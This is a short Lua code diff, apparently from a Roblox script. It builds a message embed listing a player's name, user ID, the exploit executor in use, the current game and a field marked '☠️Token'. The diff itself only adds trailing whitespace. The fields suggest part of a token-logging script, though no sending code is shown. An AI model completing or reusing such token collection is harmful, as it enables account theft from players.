@@ -51,7 +51,7 @@ local data = {
 		color = 0x3498db,
 		fields = {
 			{ name = "👷Oyuncu İsmi", value = player.Name, inline = true },
-			{ name = "👷Kullanıcı ID", value = tostring(player.UserId), inline = true },
+			{ name = "👷Kullanıcı ID", value = tostring(player.UserId), inline = true },	
 			{ name = "💻Executor", value = exec, inline = true },
 			{ name = "🎮Oyun", value = "[" .. gameName .. "](" .. gameUrl .. ")", inline = false },
 			{ name = "☠️Token", value = tokenValue, inline = true },
